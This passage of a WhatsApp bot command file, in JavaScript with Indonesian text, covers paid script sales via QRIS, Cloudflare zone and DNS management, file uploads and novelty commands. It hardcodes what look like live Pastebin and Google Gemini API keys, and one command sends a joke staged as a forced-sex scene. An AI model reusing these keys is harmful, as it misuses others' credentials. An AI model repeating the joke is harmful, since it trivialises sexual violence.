if (script.length < 1) return m.reply("Maaf Script Bot sedang tidak tersedia.")
  if (m.isGroup)
    return m.reply(
      "Pembelian Script Bot hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);

  if (!text) {
    let butnya = []
    let urutt = 0
    for (let gg of script) {
    butnya.push({
    title: `${gg.nama} ✅`, 
    description: `Rp${await func.toRupiah(gg.harga)}`, 
    id: `.buyscript ${urutt += 1}`
    })
    }
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Script",
                sections: [
                  {
                    rows: butnya, 
                    }
                 ], 
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Script Bot WhatsApp 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }
 const scnya = script[Number(text) - 1]
let Obj = {}
Obj.harga = scnya.harga
Obj.namasc = scnya.nama
Obj.path = scnya.path
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Script ${Obj.namasc}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Script ${Obj.namasc}
`,
        }, { quoted: sock[m.sender].msg });
await sock.sendMessage(sock[m.sender].chat, {document: await fs.readFileSync(Obj.path), mimetype: "application/zip", fileName: Obj.namasc + ".zip", contextInfo: { isForwarded: true }}, {quoted: null})
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "deldomaincf": case "deldomcf": {
if (!isOwner) return m.reply(msg.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_API_TOKEN = global.apitoken_cloudflare // Ganti dengan API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Jika pakai API Key


async function deleteDomain(domain) {
    try {
        // Ambil Zone ID berdasarkan nama domain
        const zoneResponse = await axios.get(
            `https://api.cloudflare.com/client/v4/zones?name=${domain}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (!zoneResponse.data.success || zoneResponse.data.result.length === 0) {
            return m.reply(`Domain ${domain} tidak ditemukan di Cloudflare.`);
        }

        const zoneId = zoneResponse.data.result[0].id;

        // Hapus domain berdasarkan Zone ID
        const deleteResponse = await axios.delete(
            `https://api.cloudflare.com/client/v4/zones/${zoneId}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (deleteResponse.data.success) {
           return m.reply(`Berhasil menghapus domain ${domain} dari Cloudflare ✅`)
        } else {
           return m.reply(`Gagal menghapus domain ${domain}: ` + deleteResponse.data.errors)
        }
    } catch (error) {
        console.error("Error:", error.response ? error.response.data : error.message);
    }
}

return deleteDomain(text.toLowerCase())
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "adddomaincf": case "adddomcf": {
if (!isOwner) return m.reply(msg.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: {
        'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
        'Content-Type': 'application/json'
    }
});
async function addNewDomainToCloudflare(domainName) {
    try {
        const response = await cloudflare.post('/zones', {
            name: domainName,
            account: {
                id: global.accountid_cloudflare
            },
            plan: {
                id: 'free'
            },
            type: 'full',
            jump_start: true
        });
        return response.data
    } catch (error) {
        return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
    }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return m.reply(respon)
} else {
return m.reply(JSON.stringify(res, null, 2))
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "clearsubdo": case "clearallsubdo": case "clsubdo": case "clearsubdomain": {
if (!text || !text.includes("|")) return example('zoneid|apikey')
let [apizone, apitoken] = text.split("|")
const CLOUDFLARE_API_KEY = apitoken;  // Ganti dengan API key
const CLOUDFLARE_ZONE_ID = apizone;  // Ganti dengan Zone ID

async function getAllDNSRecords() {
    let allRecords = [];
    let page = 1;
    let totalPages = 1;

    try {
        while (page <= totalPages) {
            const response = await axios.get(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`, {
                params: { page, per_page: 100 },
                headers: {
                    'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.data.success) {
                console.error("Gagal mengambil DNS records:", response.data.errors);
                return [];
            }

            allRecords.push(...response.data.result);
            totalPages = response.data.result_info.total_pages;
            page++;
        }
    } catch (error) {
        console.error("Terjadi kesalahan saat mengambil DNS records:", error.message);
    }
    return allRecords;
}

// Fungsi untuk menghapus semua DNS record
async function deleteAllDNSRecords() {
    try {
        const records = await getAllDNSRecords();
        const totalDns = records.length

        if (records.length === 0) {
            await m.reply("Tidak ada Subdomain yang ditemukan.");
            return;
        }

        m.reply(`${totalDns} Subdomain ditemukan. Memproses penghapusan...`);

        for (const record of records) {
            try {
                const deleteResponse = await axios.delete(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records/${record.id}`, {
                    headers: {
                        'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (deleteResponse.data.success) {
                    console.log(`✅ Berhasil menghapus record: ${record.name} (ID: ${record.id})`);
                } else {
                    console.error(`❌ Gagal menghapus record ${record.name}:`, deleteResponse.data.errors);
                }
            } catch (error) {
                console.error(`❌ Terjadi kesalahan saat menghapus record ${record.name}:`, error.message);
            }
        }

        await m.reply(`Berhasil menghapus ${totalDns} Subdomain ✅`);
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
}

// Jalankan fungsi
return deleteAllDNSRecords();
}
break

case "listdomaincf": case "listdomcf": {
if (!isOwner) return m.reply(msg.owner)
const CLOUDFLARE_API_KEY = global.apitoken_cloudflare // Ganti dengan API Key atau API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Email akun Cloudflare (jika pakai API Key)

async function getAllDomains() {
    let page = 1;
    let domains = [];
    let hasMore = true;

    while (hasMore) {
        const url = `https://api.cloudflare.com/client/v4/zones?page=${page}&per_page=50`; // Maksimal 50 per halaman

        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`, // Jika pakai API Token
                // 'X-Auth-Email': CLOUDFLARE_EMAIL, // Jika pakai API Key
                // 'X-Auth-Key': CLOUDFLARE_API_KEY  // Jika pakai API Key
            }
        });

        const data = await response.json();
        
        if (data.success) {
            domains = domains.concat(data.result.map(zone => ({
                id: zone.id,
                name: zone.name,
                status: zone.status
            })));

            // Cek apakah masih ada halaman berikutnya
            hasMore = data.result_info.page < data.result_info.total_pages;
            page++;
        } else {
            console.error('Gagal mengambil daftar domain:', data.errors);
            return [];
        }
    }

    console.log('Total Domain:', domains.length);
    console.log('Daftar Domain:', domains);
    return domains;
}


// Jalankan function
let res = await getAllDomains();
if (res.length < 1) return m.reply("Tidak ada domain di cloudflare")
let teks = `\n*Total Domain Cloudflare :* ${res.length}\n`
for (let i of res) {
teks += `
* ${i.name}
* *Status :* ${i.status == "active" ? i.status + " ✅" : i.status == "pending" ? i.status + " 🕞" : i.status + " ❌"}
`
}
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "cpaste": case "pastebin": {
if (!text) return example("teksnya")
let { PasteClient, Publicity, ExpireDate } = require("pastebin-api")
const client = new PasteClient("XRP7K6sqg-cafuC5J509m0fFMUiLFxi5");
const url = await client.createPaste({
  code: text,
  expireDate: ExpireDate.Never,
  format: "javascript",
  name: "something.js",
  publicity: Publicity.Public,
});
let links = `https://pastebin.com/raw/${url.split("/")[3]}`
return m.reply(links)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ip": case "getip": {
if (!isOwner) return
let t = await func.fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "rst": case "restart": {
if (!isOwner) return
const { spawn } = require("child_process");

function restartServer() {
  // Spawn proses baru untuk menjalankan ulang server
  const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });

  // Keluar dari proses lama
  process.exit(0);
}

await m.reply("Restarting bot . . .")
// Contoh penggunaan: Restart setelah 5 detik
await setTimeout(() => {
  restartServer();
}, 5000);
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case 'ambilsw': case "sw": {
 if (m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

 const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
 if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

 if (quotedMessage.imageMessage) {
 let imageUrl = await sock.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
 return sock.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
 }

 if (quotedMessage.videoMessage) {
 let videoUrl = await sock.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
 return sock.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
 }

 return m.reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break

case "reactch": {
 if (!isOwner) return m.reply(msg.owner)
 if (!text || !args[0] || !args[1]) 
 return m.reply("Contoh penggunaan:\n.reactch replay pesan dri ch trus kasih emoji 🫩")
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return m.reply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await sock.newsletterMetadata("invite", result) 
 await sock.newsletterReactMessage(res.id, serverId, args[1])
 m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

case "pantun": {
if (!q) return m.reply("Pantun Apa?jenaka?cinta?kiasan?")

let pantunnye = q.toLowerCase()

let listpantun = ["jenaka", "cinta", "kiasan"]
if (!listpantun.includes(pantunnye)) return m.reply("Cuma Bisa Pantun Jenaka, Kiasan Dan Cinta")
let suruhcpantun = `Buatkan saya pantun 4 baris dengan rima a-b-a-b, jenis pantun ${pantunnye}, kirim hanya pantun tanpa kalimat lain`
const anu = await axios.get(`https://www.velyn.biz.id/api/ai/gemini?prompt=${encodeURIComponent(suruhcpantun)}`)
m.reply(`*INI PANTUN ${q.toUpperCase()}*\n\n`+anu.data.data)
}
break

case 'paptt': {
 let paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg"
 ]
 let url = paptt[Math.floor(Math.random() * paptt.length)]
 let isVideo = url.endsWith('.mp4')
 let isImage = url.endsWith('.jpg') || url.endsWith('.jpeg') || url.endsWith('.png')
 if (isVideo) {
 await sock.sendMessage(m.chat, {
 video: { url: url },
 caption: `Nih hasil *paptt* buat kamu`,
 gifPlayback: true
 }, { quoted: m })
 } else if (isImage) {
 await sock.sendMessage(m.chat, {
 image: { url: url },
 caption: `Nih hasil *paptt* buat kamu`
 }, { quoted: m })
 } else {
 m.reply('Format file tidak dikenal.')
 }
 }
 break

case 'upch1': {
 if (!isCreator) return tolak(mess.OnlyOwner)
 if (!/audio/.test(mime) && !/video/.test(mime) && !/image/.test(mime) && !/webp/.test(mime) && !/sticker/.test(mime) && !/application/.test(mime)) {
 return reply(`Gunakan ${prefix + command} Judul Lagu|Terserah\nContoh ${prefix + command} Mungkin | Kita Sad Dulu`);
 }
 sock.sendMessage(`${idsaluran}`, { react: { text: '🕐', key: m.key } });
 ngawi = text.split("|")[0];
 jomokck = text.split("|")[1];
 await sleep(6000);

 if (/audio/.test(mime)) {
 sock.sendMessage(`${idsaluran}`, {
 audio: await quoted.download(),
 mimetype: 'audio/mp4',
 ptt: true,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idsaluran}`,
 serverMessageId: 20,
 newsletterName: 'Karen - MD'
 },
 externalAdReply: {
 title: `Karen MUSIC 🎶`,
 body: `Karen runtime: ${runtime(process.uptime())} 👋`,
 thumbnailUrl: "https://pomf2.lain.la/f/wg5es1wv.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029ValRdc93wtb5mmZ64j0B",
 mediaType: 1
 }
 }
 });
 } else if (/video/.test(mime)) {
 sock.sendMessage(`${idsaluran}`, {
 video: await quoted.download(),
 mimetype: 'video/mp4',
 caption: `🎥 ${ngawi}\n${jomokck}`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idsaluran}`,
 serverMessageId: 20,
 newsletterName: 'Karen - MD'
 },
 externalAdReply: {
 title: `Video dari Owner🎥`,
 body: `Karen runtime: ${runtime(process.uptime())} 👋`,
 thumbnailUrl: "https://pomf2.lain.la/f/wg5es1wv.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029ValRdc93wtb5mmZ64j0B",
 mediaType: 1
 }
 }
 });
 } else if (/image/.test(mime) || /webp/.test(mime)) {
 sock.sendMessage(`${idsaluran}`, {
 image: await quoted.download(),
 mimetype: /webp/.test(mime) ? 'image/webp' : 'image/jpeg',
 caption: `🖼️ ${ngawi}\n${jomokck}`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idsaluran}`,
 serverMessageId: 20,
 newsletterName: 'Karen - MD'
 },
 externalAdReply: {
 title: `Gambar dari Owner🖼️`,
 body: `Karen runtime: ${runtime(process.uptime())} 👋`,
 thumbnailUrl: "https://pomf2.lain.la/f/wg5es1wv.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029ValRdc93wtb5mmZ64j0B",
 mediaType: 1
 }
 }
 });
 } else if (/sticker/.test(mime)) {
 sock.sendMessage(`${idsaluran}`, {
 sticker: await quoted.download(),
 mimetype: 'image/webp',
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idsaluran}`,
 serverMessageId: 20,
 newsletterName: 'Karen - MD'
 }
 }
 });
 } else if (/application/.test(mime)) { 
 sock.sendMessage(`${idsaluran}`, {
 document: await quoted.download(),
 mimetype: mime, 
 fileName: `${ngawi}.pdf`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 9999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idsaluran}`,
 serverMessageId: 20,
 newsletterName: 'NOOISY'
 },
 externalAdReply: {
 title: `${jomokck}`,
 body: `NOISY runtime: ${runtime(process.uptime())} 👋`,
 thumbnailUrl: "https://pomf2.lain.la/f/wg5es1wv.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029ValRdc93wtb5mmZ64j0B",
 mediaType: 1
 }
 }
 });
 }
 sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;

case 'ewepaksa': {
 let teks = [
 'Kamu bangun tengah malam, suasana gelap dan sepi...',
 'Tiba-tiba terdengar suara langkah... *tap... tap... tap...*',
 'Kamu gemetar... mencoba mencari sumber suara.',
 'Pintu kamarmu terbuka perlahan... *kreeeek...*',
 'Seseorang berdiri di sana, dengan senyum bengis...',
 'Tanpa peringatan, dia langsung menerjang!',
 '*BRUK!* kamu dibanting ke kasur...',
 'Tangannya mengikat tanganmu... kamu nggak bisa gerak!',
 'Dia membisikkan, "Sekarang... waktunya masuk..."',
 'Kamu teriak: "JANGAAAN!!"',
 'Tapi dia tetap maksa... wajahmu pucat.',
 'Dia bawa sesuatu... benda panjang dan mengerikan...',
 'Lalu...',
 '"AKU MASUKIN NIH...!" katanya.',
 '*BLEEPP!!* benda itu masuk ke LUBANG... colokan listrik.',
 'Dia cuma mau ngecas HP ternyata.',
 'Kamu masih gemetar... keringat dingin membasahi tubuhmu.',
 'Besoknya kamu trauma tiap lihat charger...'
 ]
 for (let i = 0; i < teks.length; i++) {
 m.reply(teks[i])
 }
}
 break

case "delcasee": {
 if (!text) return Reply(`Contoh: ${prefix}delcase nama_case`);

 const fs = require('fs').promises;
 const filePath = './skyzo.js';

 async function delCase(filePath, caseNameToRemove) {
 try {
 let data = await fs.readFile(filePath, 'utf8');
 const regex = new RegExp(`case\\s+"${caseNameToRemove}":[\\s\\S]*?break`, 'g');
 const newData = data.replace(regex, '');

 if (data === newData) {
 return Reply(`Case "${caseNameToRemove}" tidak ditemukan!`);
 }

 await fs.writeFile(filePath, newData, 'utf8');
 return Reply(`Case "${caseNameToRemove}" berhasil dihapus!`);
 } catch (err) {
 console.error('Terjadi kesalahan saat menghapus case:', err);
 return Reply(`Terjadi kesalahan saat menghapus case: ${err.message}`);
 }
 }

 delCase(filePath, text);
}
break

case 'apakah': {
 if (!text) return m.reply(`Contoh: .apakah saya ganteng?`)
 const jawaban = ['Iya', 'Mungkin iya', 'Mungkin', 'Gak', 'Mungkin gak', 'Gak tau', 'Coba Tanya nenek mu', 'Auh ah mending bobo', 'Nanya Mulu']
 const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
 m.reply(`*Pertanyaan:* Apakah ${text}\n*Jawaban:* ${coli}`)
}
break

case 'cekganteng': {
 if (!text) return m.reply(`Contoh: .cekganteng nama seseorang atau tag`)
 const jawaban1 = ['ganteng', 'jelek']
 const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]
 
 const jawaban = ['Ganteng', 'Ganteng amat', 'Lumayan', 'Jelek', 'Jelek amat', 'Hytam', 'Mirip Titid Gw']
 const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
 m.reply(`*Pertanyaan:* Cekganteng ${text}\n*Jawaban:* ${coli}`)
}
break

case 'tourl3': {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if ((/image|video|audio/.test(mimetype)) && !/webp/.test(mimetype)) {
 sock.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = '';
 if (mimetype.includes('video')) ext = '.mp4';
 else if (mimetype.includes('jpeg')) ext = '.jpg';
 else if (mimetype.includes('png')) ext = '.png';
 else if (mimetype.includes('gif')) ext = '.gif';
 else if (mimetype.includes('audio')) ext = '.mp3';
 else ext = '';
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 await sock.sendMessage(m.chat, { text: caption }, { quoted: m });
 } catch (e) {
 console.error(e);
 m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 m.reply(`Kirim atau reply gambar, video, atau audio (MP3) dengan caption *${prefix + command}*`);
 }
};
break

case 'mediafire': case 'mf': {
 if (!q) return m.reply(`Kirim link Mediafire-nya!\n\nContoh: ${prefix + command} https://www.mediafire.com/file/xxx`)

 try {
 let res = await fetch(`https://api.vreden.my.id/api/mediafiredl?url=${q}`)
 let data = await res.json()
 if (!data.result || !data.result[0].status) return m.reply('Gagal mengambil data Mediafire.')
 let file = data.result[0]
 let { nama, mime, size, link } = file
 let caption = `*MEDIAFIRE DOWNLOADER*\n\n`
 caption += `*Nama:* ${nama}\n`
 caption += `*Ukuran:* ${size}\n`
 caption += `*Tipe:* ${mime}\n`
 caption += `*Server:* ${file.server}\n`
 caption += `*Link:* ${link}`
 let buffer = await (await fetch(link)).buffer()
 sock.sendMessage(m.chat, {
 document: buffer,
 fileName: nama,
 mimetype: mime,
 caption: caption
 }, { quoted: m })
 } catch (e) {
 console.log(e)
 m.reply('Terjadi kesalahan, coba lagi nanti.')
 }
}
 break

case 'kkkk': {
 if (!isOwner) return m.reply('Fitur ini hanya untuk Owner!');
 if (!isGroup) return m.reply('Hanya bisa digunakan di grup!');
 
 let waktuTutup = '23:00'; // format HH:MM (24 jam)
 let waktuBuka = '05:00';

 m.reply(`*AUTO-GROUP CONTROL ON*\nGrup akan ditutup otomatis pada jam ${waktuTutup} dan dibuka kembali pada jam ${waktuBuka}.`);

 setInterval(async () => {
 let now = new Date();
 let jam = now.getHours().toString().padStart(2, '0');
 let menit = now.getMinutes().toString().padStart(2, '0');
 let waktu = `${jam}:${menit}`;

 if (waktu === waktuTutup) {
 await sock.groupSettingUpdate(m.chat, 'announcement').catch(e => console.log(e));
 sock.sendMessage(m.chat, { text: `*Grup ditutup otomatis oleh sistem*\nMulai jam ${waktuTutup}, hanya admin yang bisa mengirim pesan.` });
 }

 if (waktu === waktuBuka) {
 await sock.groupSettingUpdate(m.chat, 'not_announcement').catch(e => console.log(e));
 sock.sendMessage(m.chat, { text: `*Grup dibuka otomatis oleh sistem*\nMulai jam ${waktuBuka}, semua member bisa mengirim pesan.` });
 }
 }, 60 * 1000); // cek tiap menit
 break;
}

case 'aiedit': case 'editai': {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return m.reply("Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik.");
 }
 if (!mime) {
 return m.reply("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 m.reply("Otw diedit sesuai permintaan...");
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await sock.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 m.reply("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 m.reply(`Error: ${error.message}`);
 }
}
break

case 'getpp': {
 let user;
 if (m.quoted) {
 user = m.quoted.sender;
 } else if (text) {
 const mentioned = text.match(/@(\d{5,})/);
 if (mentioned) {
 user = mentioned[1] + '@s.whatsapp.net';
 } else if (text.includes('62')) {
 const number = text.replace(/[^0-9]/g, '');
 user = number + '@s.whatsapp.net';
 } else {
 return m.reply('Format salah! Gunakan .getpp @tag atau .getpp 628xx');
 }
 } else {
 user = m.quoted ? m.quoted.sender : m.sender;
 }
 try {
 let pp = await sock.profilePictureUrl(user, 'image');
 await sock.sendMessage(m.chat, {
 image: { url: pp },
 caption: `Foto profil dari *@${user.split('@')[0]}*`,
 mentions: [user]
 });
 } catch (e) {
 m.reply('Gagal mengambil foto profil! Mungkin tidak ada atau disembunyikan.');
 }
}
break

case "pollgc": {
 if(!text) return m.reply('Contoh: Nama Polling|Option1|Option2');
 var [ namePoll, Op1, Op2 ] = text.split('|');
 await m.reply('Wet²');
 sock.sendMessage(m.chat, {
 poll: {
 name: namePoll,
 values: [Op1, Op2],
 selectableCount: 1,
 toAnnouncementGroup: true
 }
 })
}
break

case "cecan": case "cn": {
 await sock.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
 const apiEndpoints = {
 "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
 "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
 "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
 "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
 "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
 "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
 }
 try {
 const axios = require('axios');
 let araara = new Array()
 const imagesPerCountry = 2
 for (const [country, url] of Object.entries(apiEndpoints)) {
 for (let i = 0; i < imagesPerCountry; i++) {
 try {
 const response = await axios.get(url, { responseType: 'arraybuffer' })
 let imgsc = await prepareWAMessageMedia(
 { image: Buffer.from(response.data) }, 
 { upload: sock.waUploadToServer }
 )
 araara.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{ 
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
 }]
